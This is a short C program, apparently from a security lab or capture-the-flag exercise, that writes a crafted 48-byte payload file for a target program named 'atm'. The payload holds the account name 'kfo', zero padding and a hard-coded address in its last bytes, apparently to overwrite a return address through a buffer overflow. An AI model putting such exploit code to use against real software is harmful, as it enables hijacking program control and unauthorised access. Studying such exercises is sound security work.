#include <errno.h>
#include <error.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
    const char *filename = argc > 1 ? argv[1] : "password.txt";
    FILE *fp = fopen(filename, "w");
    if (!fp) error(1, errno, "%s", argv[1]);

    //char bytes[] = { '1', '0', '7'}; // edit bytes as desired
    char bytes[] = {
'o','f','k', 0, 0, 0, 0, 0,// using account "kfo"
0, 0, 0, 0, 0, 0, 0, 0,    //call by ./atm kfo < password.txt
0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0,
0x37, 0x0b, 0x40, 0, 0, 0, 0, 0};

    fwrite(bytes, 1, sizeof(bytes), fp);
    fclose(fp);
    printf("Wrote password to file '%s'.\n", filename);
    return 0;
}
